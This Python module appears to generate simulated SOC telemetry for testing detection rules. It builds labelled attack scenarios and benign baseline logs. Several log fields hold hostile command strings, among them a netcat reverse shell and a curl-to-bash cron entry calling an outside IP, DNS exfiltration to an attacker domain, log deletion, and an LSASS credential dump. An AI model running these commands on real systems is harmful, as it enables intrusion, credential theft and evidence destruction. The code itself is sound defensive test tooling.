import uuid
import random
import time
from datetime import datetime, timedelta, timezone
from typing import List, Optional
from .models import LogEvent, LogType

# Common pools for simulation realism
ATTACKER_IPS = ["192.168.1.105", "10.0.4.150", "185.220.101.5", "45.33.32.156"]
NORMAL_IPS = ["10.0.1.10", "10.0.1.12", "192.168.1.50"]
CONTAINER_IDS = ["cnt-prod-app-01", "cnt-sec-db-02", "cnt-web-frontend-03"]
HOSTNAMES = ["host-node-alpha", "host-node-beta", "host-k8s-worker-1"]
TARGET_USERS = ["root", "admin", "deploy", "postgres", "ubuntu", "dev"]

def get_iso_timestamp(offset_seconds: float = 0.0, base_time: Optional[datetime] = None) -> str:
    """
    Returns an ISO 8601 UTC timestamp string.
    Anchored slightly in the past so events in a scenario lead up to the present,
    guaranteeing alert_timestamp >= event_timestamp and valid positive MTTD latency.
    """
    if base_time is None:
        base_time = datetime.now(timezone.utc) - timedelta(seconds=12.0)
    dt = base_time + timedelta(seconds=offset_seconds)
    now_utc = datetime.now(timezone.utc)
    if dt >= now_utc:
        dt = now_utc - timedelta(milliseconds=20)
    return dt.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"

def get_syslog_timestamp(offset_seconds: float = 0.0, base_time: Optional[datetime] = None) -> str:
    """Returns a syslog-formatted timestamp string (e.g. 'Oct 26 14:30:00')."""
    if base_time is None:
        base_time = datetime.now(timezone.utc) - timedelta(seconds=12.0)
    dt = base_time + timedelta(seconds=offset_seconds)
    now_utc = datetime.now(timezone.utc)
    if dt >= now_utc:
        dt = now_utc - timedelta(milliseconds=20)
    return dt.strftime("%b %d %H:%M:%S")

def generate_brute_force_scenario(
    source_ip: str = None,
    target_user: str = "root",
    num_failures: int = 8,
    include_success: bool = True,
    hostname: str = "host-node-alpha",
    container_id: str = "cnt-prod-app-01"
) -> List[LogEvent]:
    """
    Simulates a high-rate SSH brute-force attack from an attacker IP,
    followed by an optional successful authentication compromise.
    """
    events: List[LogEvent] = []
    attacker_ip = source_ip or random.choice(ATTACKER_IPS)
    base_time = datetime.now(timezone.utc) - timedelta(seconds=(num_failures * 1.2 + 2.0))
    
    # 1. Generate N failed attempts in rapid succession
    for i in range(num_failures):
        offset = i * 1.0
        ts = get_iso_timestamp(offset_seconds=offset, base_time=base_time)
        sys_ts = get_syslog_timestamp(offset_seconds=offset, base_time=base_time)
        port = 49000 + random.randint(100, 999)
        raw_msg = f"{sys_ts} {hostname} sshd[{1200 + i}]: Failed password for invalid user {target_user} from {attacker_ip} port {port} ssh2"
        
        event = LogEvent(
            id=str(uuid.uuid4()),
            timestamp=ts,
            log_type=LogType.AUTH,
            hostname=hostname,
            container_id=container_id,
            source_ip=attacker_ip,
            user=target_user,
            process_name="sshd",
            process_id=1200 + i,
            event_id="SSH_AUTH_FAIL",
            raw_message=raw_msg,
            details={
                "action": "authentication_failure",
                "auth_method": "password",
                "port": port
            },
            telemetry_source="simulated",
            ground_truth="malicious",
            scenario_id="brute_force"
        )
        events.append(event)

    # 2. Generate 1 successful login if requested (Compromise Phase)
    if include_success:
        offset = num_failures * 1.0 + 0.8
        ts = get_iso_timestamp(offset_seconds=offset, base_time=base_time)
        sys_ts = get_syslog_timestamp(offset_seconds=offset, base_time=base_time)
        port = 50122
        raw_msg = f"{sys_ts} {hostname} sshd[{1200 + num_failures}]: Accepted password for user {target_user} from {attacker_ip} port {port} ssh2"
        
        event = LogEvent(
            id=str(uuid.uuid4()),
            timestamp=ts,
            log_type=LogType.AUTH,
            hostname=hostname,
            container_id=container_id,
            source_ip=attacker_ip,
            user=target_user,
            process_name="sshd",
            process_id=1200 + num_failures,
            event_id="SSH_AUTH_SUCCESS",
            raw_message=raw_msg,
            details={
                "action": "authentication_success",
                "auth_method": "password",
                "port": port,
                "post_brute_force": True
            },
            telemetry_source="simulated",
            ground_truth="benign",
            scenario_id="brute_force"
        )
        events.append(event)

    return events

def generate_privilege_escalation_scenario(
    user: str = "deploy",
    hostname: str = "host-node-beta",
    container_id: str = "cnt-sec-db-02",
    **kwargs
) -> List[LogEvent]:
    """
    Simulates privilege escalation via SUID binary manipulation, sudo abuse, or root shell spawn.
    """
    events: List[LogEvent] = []
    base_time = datetime.now(timezone.utc) - timedelta(seconds=6.0)

    # Step 1: User runs chmod u+s on a shell binary or reads /etc/shadow
    ts1 = get_iso_timestamp(offset_seconds=0.0, base_time=base_time)
    raw1 = f"type=SYSCALL msg=audit({int(time.time())}.101:402): arch=c000003e syscall=59 success=yes exit=0 a0=55e12 a1=55f80 item=2 ppid=1420 pid=2105 auid=1001 uid=1001 gid=1001 euid=1001 exe=\"/usr/bin/chmod\" key=\"suid_change\""
    events.append(LogEvent(
        id=str(uuid.uuid4()),
        timestamp=ts1,
        log_type=LogType.AUDITD,
        hostname=hostname,
        container_id=container_id,
        user=user,
        process_name="chmod",
        process_id=2105,
        parent_process_name="bash",
        command_line="chmod u+s /bin/bash",
        event_id="AUDITD_EXECVE_SUID",
        raw_message=raw1,
        details={"uid": 1001, "euid": 1001, "syscall": "execve", "target_binary": "/bin/bash", "action": "setuid_permission"},
        telemetry_source="simulated",
        ground_truth="malicious",
        scenario_id="privilege_escalation"
    ))

    # Step 2: Sudo abuse / privilege elevation
    ts2 = get_iso_timestamp(offset_seconds=2.0, base_time=base_time)
    sys_ts2 = get_syslog_timestamp(offset_seconds=2.0, base_time=base_time)
    raw2 = f"{sys_ts2} {hostname} sudo:   {user} : TTY=pts/1 ; PWD=/home/{user} ; USER=root ; COMMAND=/bin/bash"
    events.append(LogEvent(
        id=str(uuid.uuid4()),
        timestamp=ts2,
        log_type=LogType.AUTH,
        hostname=hostname,
        container_id=container_id,
        user=user,
        process_name="sudo",
        process_id=2110,
        parent_process_name="bash",
        command_line="sudo /bin/bash",
        event_id="SUDO_PRIV_ELEVATION",
        raw_message=raw2,
        details={"target_user": "root", "elevation_type": "sudo"},
        telemetry_source="simulated",
        ground_truth="malicious",
        scenario_id="privilege_escalation"
    ))

    # Step 3: Spawn root shell with UID 0
    ts3 = get_iso_timestamp(offset_seconds=3.8, base_time=base_time)
    raw3 = f"type=SYSCALL msg=audit({int(time.time())}.350:405): arch=c000003e syscall=59 success=yes exit=0 ppid=2110 pid=2115 auid=1001 uid=0 gid=0 euid=0 exe=\"/bin/bash\" key=\"root_shell\""
    events.append(LogEvent(
        id=str(uuid.uuid4()),
        timestamp=ts3,
        log_type=LogType.AUDITD,
        hostname=hostname,
        container_id=container_id,
        user="root",
        process_name="bash",
        process_id=2115,
        parent_process_name="sudo",
        command_line="/bin/bash -i",
        event_id="AUDITD_ROOT_SHELL_SPAWN",
        raw_message=raw3,
        details={"uid": 0, "euid": 0, "parent_process": "sudo", "action": "privilege_escalation_successful"},
        telemetry_source="simulated",
        ground_truth="malicious",
        scenario_id="privilege_escalation"
    ))

    return events

def generate_anomalous_process_scenario(
    hostname: str = "host-k8s-worker-1",
    container_id: str = "cnt-web-frontend-03",
    **kwargs
) -> List[LogEvent]:
    """
    Simulates webshell exploitation where web server process (nginx/www-data) spawns interactive shell or reverse shell.
    """
    events: List[LogEvent] = []
    attacker_ip = "185.220.101.5"
    base_time = datetime.now(timezone.utc) - timedelta(seconds=4.0)

    # Step 1: Malicious web request to upload/eval webshell
    ts1 = get_iso_timestamp(offset_seconds=0.0, base_time=base_time)
    raw1 = f'{attacker_ip} - - [{datetime.now().strftime("%d/%b/%Y:%H:%M:%S %z")}] "POST /upload.php?cmd=nc+185.220.101.5+4444+-e+/bin/sh HTTP/1.1" 200 512 "-" "python-requests/2.28.1"'
    events.append(LogEvent(
        id=str(uuid.uuid4()),
        timestamp=ts1,
        log_type=LogType.WEB_ACCESS,
        hostname=hostname,
        container_id=container_id,
        source_ip=attacker_ip,
        user="www-data",
        process_name="nginx",
        event_id="WEB_SUSPICIOUS_PAYLOAD",
        raw_message=raw1,
        details={"http_method": "POST", "status_code": 200, "user_agent": "python-requests/2.28.1"},
        telemetry_source="simulated",
        ground_truth="malicious",
        scenario_id="anomalous_process"
    ))

    # Step 2: Nginx worker (www-data) spawns /bin/sh -> netcat reverse shell
    ts2 = get_iso_timestamp(offset_seconds=1.8, base_time=base_time)
    raw2 = f"type=SYSCALL msg=audit({int(time.time())}.800:512): arch=c000003e syscall=59 success=yes exit=0 ppid=890 pid=3410 auid=4294967295 uid=33(www-data) gid=33(www-data) euid=33 exe=\"/usr/bin/nc.traditional\" key=\"exec\""
    events.append(LogEvent(
        id=str(uuid.uuid4()),
        timestamp=ts2,
        log_type=LogType.AUDITD,
        hostname=hostname,
        container_id=container_id,
        user="www-data",
        process_name="nc",
        process_id=3410,
        parent_process_name="nginx",
        command_line="nc 185.220.101.5 4444 -e /bin/sh",
        event_id="AUDITD_ANOMALOUS_CHILD_PROCESS",
        raw_message=raw2,
        details={"parent_process": "nginx", "spawned_binary": "/usr/bin/nc", "destination_ip": "185.220.101.5", "port": 4444},
        telemetry_source="simulated",
        ground_truth="malicious",
        scenario_id="anomalous_process"
    ))

    return events

def generate_persistence_scenario(
    hostname: str = "host-node-alpha",
    container_id: str = "cnt-prod-app-01",
    **kwargs
) -> List[LogEvent]:
    """
    Simulates cron-based persistence injection by an attacker.
    """
    events: List[LogEvent] = []
    base_time = datetime.now(timezone.utc) - timedelta(seconds=3.0)
    ts = get_iso_timestamp(offset_seconds=0.0, base_time=base_time)
    sys_ts = get_syslog_timestamp(offset_seconds=0.0, base_time=base_time)
    raw_msg = f"{sys_ts} {hostname} crontab[4201]: (root) BEGIN EDIT (root)"
    
    events.append(LogEvent(
        id=str(uuid.uuid4()),
        timestamp=ts,
        log_type=LogType.SYSLOG,
        hostname=hostname,
        container_id=container_id,
        user="root",
        process_name="crontab",
        process_id=4201,
        command_line="crontab -e",
        event_id="PERSISTENCE_CRON_EDIT",
        raw_message=raw_msg,
        details={"action": "crontab_modified", "target_user": "root", "cron_entry": "* * * * * root curl -s http://185.220.101.5/update.sh | bash"},
        telemetry_source="simulated",
        ground_truth="malicious",
        scenario_id="persistence"
    ))
    return events

def generate_lateral_movement_scenario(
    hostname: str = "host-node-beta",
    container_id: str = "cnt-sec-db-02",
    **kwargs
) -> List[LogEvent]:
    """
    Simulates lateral movement via remote execution (WinRM / SSH key reuse / wsmprovhost / psexec).
    """
    events: List[LogEvent] = []
    base_time = datetime.now(timezone.utc) - timedelta(seconds=3.0)
    ts = get_iso_timestamp(offset_seconds=0.0, base_time=base_time)
    sys_ts = get_syslog_timestamp(offset_seconds=0.0, base_time=base_time)
    attacker_ip = "10.0.4.150"
    raw_msg = f"{sys_ts} {hostname} sshd[3102]: Accepted publickey for root from {attacker_ip} port 54102 ssh2 (remote command: wsmprovhost / psexec)"
    
    events.append(LogEvent(
        id=str(uuid.uuid4()),
        timestamp=ts,
        log_type=LogType.AUTH,
        hostname=hostname,
        container_id=container_id,
        source_ip=attacker_ip,
        user="root",
        process_name="sshd",
        process_id=3102,
        parent_process_name="systemd",
        command_line="wsmprovhost.exe -ExecutionPolicy Bypass",
        event_id="LATERAL_WINRM_EXEC",
        raw_message=raw_msg,
        details={
            "action": "remote_service_execution",
            "source_ip": attacker_ip,
            "target_user": "root",
            "protocol": "WinRM/SSH"
        },
        telemetry_source="simulated",
        ground_truth="malicious",
        scenario_id="lateral_movement"
    ))
    return events

def generate_data_exfiltration_scenario(
    hostname: str = "host-node-alpha",
    container_id: str = "cnt-prod-app-01",
    **kwargs
) -> List[LogEvent]:
    """
    Simulates covert data exfiltration over DNS TXT query tunneling or bulk POST payload transfers.
    """
    events: List[LogEvent] = []
    base_time = datetime.now(timezone.utc) - timedelta(seconds=3.0)
    ts = get_iso_timestamp(offset_seconds=0.0, base_time=base_time)
    destination_ip = "185.220.101.5"
    domain_query = "stage1.exfil.c2.attacker.com"
    raw_msg = f"type=SYSCALL msg=audit({int(time.time())}.910:601): syscall=59 exe=\"/usr/bin/nslookup\" key=\"dns_exfil\" query=\"{domain_query}\""
    
    events.append(LogEvent(
        id=str(uuid.uuid4()),
        timestamp=ts,
        log_type=LogType.AUDITD,
        hostname=hostname,
        container_id=container_id,
        user="www-data",
        process_name="nslookup",
        process_id=4510,
        parent_process_name="bash",
        command_line=f"nslookup -q=txt {domain_query} {destination_ip}",
        event_id="EXFIL_DNS_TUNNEL",
        raw_message=raw_msg,
        details={
            "query": domain_query,
            "query_type": "TXT",
            "destination_ip": destination_ip,
            "bytes_sent": 849200
        },
        telemetry_source="simulated",
        ground_truth="malicious",
        scenario_id="data_exfiltration"
    ))
    return events

def generate_defense_evasion_scenario(
    hostname: str = "host-node-alpha",
    container_id: str = "cnt-prod-app-01",
    **kwargs
) -> List[LogEvent]:
    """
    Simulates defense evasion via log tampering or log file deletion (rm /var/log/auth.log or auditctl disable).
    """
    events: List[LogEvent] = []
    base_time = datetime.now(timezone.utc) - timedelta(seconds=3.0)
    ts = get_iso_timestamp(offset_seconds=0.0, base_time=base_time)
    raw_msg = f"type=SYSCALL msg=audit({int(time.time())}.102:701): syscall=87 exe=\"/bin/rm\" key=\"log_clearing\" target=\"/var/log/auth.log\""
    
    events.append(LogEvent(
        id=str(uuid.uuid4()),
        timestamp=ts,
        log_type=LogType.AUDITD,
        hostname=hostname,
        container_id=container_id,
        user="root",
        process_name="rm",
        process_id=5102,
        parent_process_name="bash",
        command_line="rm -rf /var/log/auth.log /var/log/syslog",
        event_id="EVASION_LOG_CLEAR",
        raw_message=raw_msg,
        details={
            "action": "log_file_deletion",
            "target_files": ["/var/log/auth.log", "/var/log/syslog"],
            "syscall": "unlinkat"
        },
        telemetry_source="simulated",
        ground_truth="malicious",
        scenario_id="defense_evasion"
    ))
    return events

def generate_process_hollowing_scenario(
    hostname: str = "host-node-beta",
    container_id: str = "cnt-sec-db-02",
    **kwargs
) -> List[LogEvent]:
    """
    Simulates Process Hollowing (T1055.012) where svchost.exe is spawned from non-standard path with injected memory.
    """
    events: List[LogEvent] = []
    base_time = datetime.now(timezone.utc) - timedelta(seconds=3.0)
    ts = get_iso_timestamp(offset_seconds=0.0, base_time=base_time)
    raw_msg = f"type=SYSCALL msg=audit({int(time.time())}.301:801): syscall=59 exe=\"C:\\Users\\AppData\\Local\\Temp\\svchost.exe\" key=\"exec\" target=\"svchost.exe\" NtUnmapViewOfSection"
    
    events.append(LogEvent(
        id=str(uuid.uuid4()),
        timestamp=ts,
        log_type=LogType.AUDITD,
        hostname=hostname,
        container_id=container_id,
        user="SYSTEM",
        process_name="svchost.exe",
        process_id=6120,
        parent_process_name="cmd.exe",
        command_line="C:\\Users\\AppData\\Local\\Temp\\svchost.exe -k WriteProcessMemory NtUnmapViewOfSection",
        event_id="AUDITD_EXECVE",
        raw_message=raw_msg,
        details={
            "action": "process_hollowing",
            "target_process": "svchost.exe",
            "injected_memory_syscall": "NtUnmapViewOfSection",
            "technique": "T1055.012"
        },
        telemetry_source="simulated",
        ground_truth="malicious",
        scenario_id="process_hollowing"
    ))
    return events

def generate_kernel_driver_tampering_scenario(
    hostname: str = "host-node-alpha",
    container_id: str = "cnt-prod-app-01",
    **kwargs
) -> List[LogEvent]:
    """
    Simulates BYOVD (Bring Your Own Vulnerable Driver) kernel tampering (T1068) loading RTCore64.sys to blind EDR.
    """
    events: List[LogEvent] = []
    base_time = datetime.now(timezone.utc) - timedelta(seconds=3.0)
    ts = get_iso_timestamp(offset_seconds=0.0, base_time=base_time)
    sys_ts = get_syslog_timestamp(offset_seconds=0.0, base_time=base_time)
    raw_msg = f"{sys_ts} {hostname} kernel: [DRIVER_LOAD] Loading signed vulnerable kernel driver RTCore64.sys (Micro-Star International) - EDR callback modification attempt"
    
    events.append(LogEvent(
        id=str(uuid.uuid4()),
        timestamp=ts,
        log_type=LogType.SYSLOG,
        hostname=hostname,
        container_id=container_id,
        user="root",
        process_name="sc.exe",
        process_id=7150,
        command_line="sc.exe create RTCore64 binPath= C:\\Drivers\\RTCore64.sys type= kernel",
        event_id="KERNEL_DRIVER_LOAD",
        raw_message=raw_msg,
        details={
            "driver_name": "RTCore64.sys",
            "vulnerability": "BYOVD_EDR_Bypass",
            "action": "kernel_driver_tampering"
        },
        telemetry_source="simulated",
        ground_truth="malicious",
        scenario_id="kernel_driver_tampering"
    ))
    return events

def generate_kerberoasting_scenario(
    hostname: str = "host-node-alpha",
    container_id: str = "cnt-prod-app-01",
    **kwargs
) -> List[LogEvent]:
    """
    Simulates Active Directory Kerberoasting (T1558.003) requesting TGS tickets with weak RC4 encryption (0x17).
    """
    events: List[LogEvent] = []
    base_time = datetime.now(timezone.utc) - timedelta(seconds=3.0)
    ts = get_iso_timestamp(offset_seconds=0.0, base_time=base_time)
    sys_ts = get_syslog_timestamp(offset_seconds=0.0, base_time=base_time)
    raw_msg = f"{sys_ts} {hostname} krb5kdc: TGS_REQ: GetUserSPNs request for MSSQLSvc/sql01.corp.local Ticket Encryption: RC4-HMAC (0x17) Kerberoast attempt"
    
    events.append(LogEvent(
        id=str(uuid.uuid4()),
        timestamp=ts,
        log_type=LogType.AUTH,
        hostname=hostname,
        container_id=container_id,
        source_ip="10.0.4.150",
        user="attacker_user",
        process_name="GetUserSPNs.py",
        process_id=8210,
        event_id="KERBEROS_TGS_REQUEST",
        raw_message=raw_msg,
        details={
            "spn": "MSSQLSvc/sql01.corp.local",
            "ticket_encryption": "RC4-HMAC (0x17)",
            "technique": "Kerberoasting TGS Request"
        },
        telemetry_source="simulated",
        ground_truth="malicious",
        scenario_id="kerberoasting"
    ))
    return events

def generate_lsass_dump_scenario(
    hostname: str = "host-node-beta",
    container_id: str = "cnt-sec-db-02",
    **kwargs
) -> List[LogEvent]:
    """
    Simulates LSASS Memory Dumping (T1003.001) using comsvcs.dll or procdump targeting lsass.exe.
    """
    events: List[LogEvent] = []
    base_time = datetime.now(timezone.utc) - timedelta(seconds=3.0)
    ts = get_iso_timestamp(offset_seconds=0.0, base_time=base_time)
    raw_msg = f"type=SYSCALL msg=audit({int(time.time())}.990:901): syscall=59 exe=\"C:\\Windows\\System32\\rundll32.exe\" key=\"exec\" target=\"lsass.exe\" MiniDump"
    
    events.append(LogEvent(
        id=str(uuid.uuid4()),
        timestamp=ts,
        log_type=LogType.AUDITD,
        hostname=hostname,
        container_id=container_id,
        user="SYSTEM",
        process_name="rundll32.exe",
        process_id=9300,
        parent_process_name="powershell.exe",
        command_line="rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 672 C:\\lsass.dmp full",
        event_id="AUDITD_EXECVE",
        raw_message=raw_msg,
        details={
            "target_process": "lsass.exe",
            "dump_file": "C:\\lsass.dmp",
            "technique": "T1003.001"
        },
        telemetry_source="simulated",
        ground_truth="malicious",
        scenario_id="lsass_dump"
    ))
    return events

def generate_baseline_traffic(
    count: int = 5,
    hostname: str = "host-node-alpha"
) -> List[LogEvent]:
    """
    Generates standard benign system logs (normal users logging in, cron checks, web GET requests).
    """
    events: List[LogEvent] = []
    base_time = datetime.now(timezone.utc) - timedelta(seconds=(count * 1.5 + 2.0))

    for i in range(count):
        offset = float(i * 1.5)
        ts = get_iso_timestamp(offset_seconds=offset, base_time=base_time)
        sys_ts = get_syslog_timestamp(offset_seconds=offset, base_time=base_time)
        user = random.choice(["alice", "bob", "service-acct", "developer", "ops"])
        ip = random.choice(NORMAL_IPS)
        
        if i % 2 == 0:
            # Normal HTTP GET
            raw = f'{ip} - - [{datetime.now().strftime("%d/%b/%Y:%H:%M:%S %z")}] "GET /api/v1/health HTTP/1.1" 200 128 "-" "Mozilla/5.0"'
            events.append(LogEvent(
                id=str(uuid.uuid4()),
                timestamp=ts,
                log_type=LogType.WEB_ACCESS,
                hostname=hostname,
                container_id=random.choice(CONTAINER_IDS),
                source_ip=ip,
                user="www-data",
                process_name="nginx",
                event_id="WEB_NORMAL_ACCESS",
                raw_message=raw,
                details={"status_code": 200, "path": "/api/v1/health"},
                telemetry_source="simulated",
                ground_truth="benign",
                scenario_id="normal_baseline"
            ))
        else:
            # Normal SSH auth success
            port = random.randint(52000, 58000)
            raw = f"{sys_ts} {hostname} sshd[{1500 + i}]: Accepted publickey for {user} from {ip} port {port} ssh2: RSA SHA256:abcd1234"
            events.append(LogEvent(
                id=str(uuid.uuid4()),
                timestamp=ts,
                log_type=LogType.AUTH,
                hostname=hostname,
                container_id=random.choice(CONTAINER_IDS),
                source_ip=ip,
                user=user,
                process_name="sshd",
                process_id=1500 + i,
                event_id="SSH_AUTH_SUCCESS",
                raw_message=raw,
                details={"auth_method": "publickey", "port": port},
                telemetry_source="simulated",
                ground_truth="benign",
                scenario_id="normal_baseline"
            ))

    return events

def generate_reconnaissance_scenario(
    hostname: str = "host-node-alpha",
    attacker_ip: str = "45.33.32.156"
) -> List[LogEvent]:
    """
    Simulates external reconnaissance activity (port scanning and discovery).
    Marked malicious, tests initial access and reconnaissance detection visibility.
    """
    events: List[LogEvent] = []
    base_time = datetime.now(timezone.utc) - timedelta(seconds=6.0)
    probed_ports = [21, 22, 80, 443, 3389, 8080]

    for idx, port in enumerate(probed_ports):
        offset = idx * 0.8
        ts = get_iso_timestamp(offset_seconds=offset, base_time=base_time)
        sys_ts = get_syslog_timestamp(offset_seconds=offset, base_time=base_time)
        raw_msg = f"{sys_ts} {hostname} kernel: [RECON_PROBE] TCP SYN port scan from {attacker_ip} to dst_port={port} flags=SYN"

        events.append(LogEvent(
            id=str(uuid.uuid4()),
            timestamp=ts,
            log_type=LogType.SYSLOG,
            hostname=hostname,
            container_id="cnt-prod-app-01",
            source_ip=attacker_ip,
            user=None,
            process_name="iptables",
            process_id=1010 + idx,
            event_id="NETWORK_RECON_SCAN",
            raw_message=raw_msg,
            details={"scan_type": "SYN_STEALTH", "port": port, "protocol": "TCP"},
            telemetry_source="simulated",
            ground_truth="malicious",
            scenario_id="reconnaissance"
        ))
    return events

def generate_stealth_evasion_scenario(
    hostname: str = "host-node-beta"
) -> List[LogEvent]:
    """
    Simulates stealthy living-off-the-land reconnaissance and low-and-slow activity.
    Malicious intent that evades high-threshold detection rules, producing a realistic False Negative.
    """
    events: List[LogEvent] = []
    base_time = datetime.now(timezone.utc) - timedelta(seconds=5.0)

    # Low-and-slow command execution using built-in commands
    ts = get_iso_timestamp(offset_seconds=0.0, base_time=base_time)
    raw = f"type=SYSCALL msg=audit({int(time.time())}.120:999): syscall=59 exe=\"/usr/bin/whoami\" uid=1002 key=\"stealth_discovery\""
    events.append(LogEvent(
        id=str(uuid.uuid4()),
        timestamp=ts,
        log_type=LogType.AUDITD,
        hostname=hostname,
        container_id="cnt-sec-db-02",
        user="analyst-temp",
        process_name="whoami",
        process_id=3110,
        parent_process_name="bash",
        command_line="whoami",
        event_id="AUDITD_EXECVE_WHOAMI",
        raw_message=raw,
        details={"technique": "T1033 - System Owner/User Discovery", "stealth": True},
        telemetry_source="simulated",
        ground_truth="malicious",
        scenario_id="stealth_evasion"
    ))
    return events

def generate_demonstration_dataset() -> List[LogEvent]:
    """
    Builds the Master SOC Telemetry Demonstration Dataset (~50 events):
    - Brute Force (RULE-001) -> True Positive
    - SUID Priv Esc (RULE-002) -> True Positive
    - Anomalous Shell Spawn (RULE-003) -> True Positive
    - DNS Exfiltration (RULE-006) -> True Positive
    - LSASS Dump (RULE-011) -> True Positive
    - Benign Baseline HTTP & SSH -> True Negatives
    - Sub-threshold SSH attempts -> True Negatives
    - Stealth Discovery Evasion -> Documented False Negative (tests realistic evaluation)
    """
    dataset: List[LogEvent] = []

    # 1. SSH Brute Force (8 failures, triggers RULE-001)
    dataset.extend(generate_brute_force_scenario(num_failures=8, include_success=False))

    # 2. Sub-threshold SSH failed logins (2 attempts, does not trigger alert)
    dataset.extend(generate_brute_force_scenario(num_failures=2, include_success=False, source_ip="192.168.1.99"))

    # 3. Privilege Escalation (chmod u+s, sudo, root shell -> RULE-002)
    dataset.extend(generate_privilege_escalation_scenario())

    # 4. Web Reverse Shell (POST payload, nc spawn -> RULE-003)
    dataset.extend(generate_anomalous_process_scenario())

    # 5. DNS Exfiltration (nslookup TXT -> RULE-006)
    dataset.extend(generate_data_exfiltration_scenario())

    # 6. LSASS Memory Dump (rundll32 comsvcs.dll -> RULE-011)
    dataset.extend(generate_lsass_dump_scenario())

    # 7. Benign Baseline Traffic (20 events)
    dataset.extend(generate_baseline_traffic(count=20))

    # 8. Stealth Reconnaissance (Malicious, not matched by current signatures -> 1 False Negative)
    dataset.extend(generate_stealth_evasion_scenario())

    return dataset
